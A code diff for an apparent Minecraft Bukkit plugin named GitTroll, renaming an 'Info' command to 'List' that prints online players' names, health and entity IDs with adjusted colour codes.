@@ -1,7 +1,5 @@
 package net.Lenni0451.GitTroll.command.commands.player;
 
-import java.util.List;
-
 import org.bukkit.Bukkit;
 import org.bukkit.entity.Player;
 
@@ -9,10 +7,10 @@ import net.Lenni0451.GitTroll.command.CommandBase;
 import net.Lenni0451.GitTroll.utils.ArrayHelper;
 import net.Lenni0451.GitTroll.utils.CustomPlayer;
 
-public class Info extends CommandBase {
+public class List extends CommandBase {
 
-	public Info() {
-		super("Info", "Get some information about online players");
+	public List() {
+		super("List", "Get a list of all online players with some information");
 	}
 
 	@Override
@@ -20,7 +18,7 @@ public class Info extends CommandBase {
 		if(args.isEmpty()) {
 			executor.sendGitMessage("Online players:");
 			for(Player player : Bukkit.getOnlinePlayers()) {
-				executor.sendMessage(" §7- §6" + (CustomPlayer.instanceOf(player).isTrusted() ? "§3" : "") + player.getName() + " §7| §c" + player.getHealth() + "\u2764 §7| §6ID: §c" + player.getEntityId());
+				executor.sendMessage(" §7- §6" + player.getName() + " §7| §4" + player.getHealth() + "\u2764 §7| §6ID: §4" + player.getEntityId());
 			}
 		} else {
 			this.commandWrong();
@@ -28,6 +26,6 @@ public class Info extends CommandBase {
 	}
 
 	@Override
-	public void tabComplete(List<String> tabComplete, ArrayHelper args) {}
-	
+	public void tabComplete(java.util.List<String> tabComplete, ArrayHelper args) {}
+
 }
